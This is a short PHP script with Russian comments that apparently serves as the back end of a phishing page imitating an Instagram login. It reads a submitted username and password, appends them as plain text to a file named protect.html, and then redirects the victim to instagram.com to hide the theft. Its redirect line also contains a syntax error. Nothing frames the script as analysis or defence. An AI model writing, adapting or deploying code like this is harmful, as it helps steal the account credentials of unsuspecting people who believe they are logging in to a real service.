<?php
// Получение данных из POST-запроса
$var1 = $_POST['username'] ?? null;
$var2 = $_POST['password'] ?? null;

// Проверка наличия данных
if (!$var1 || !$var2) {
    die('Error: Username or Password not provided.');
}

// Проверка наличия файла protect.html
$myFile = @file_get_contents('protect.html');
$searchString = "<html><title>WELCOME</title></html>";

if ($myFile !== $searchString) {
    // Сохранение данных в файл
    $log = "EMAIL: " . $var1 . " [PASS]: " . $var2 . "\n";
    file_put_contents('protect.html', $log, FILE_APPEND);

    // Перенаправление
    header('Location: https://instagram.com'/);
    exit();
} else {
    echo 'LOGIN SUCCESSFUL!';
}
exit();
?>
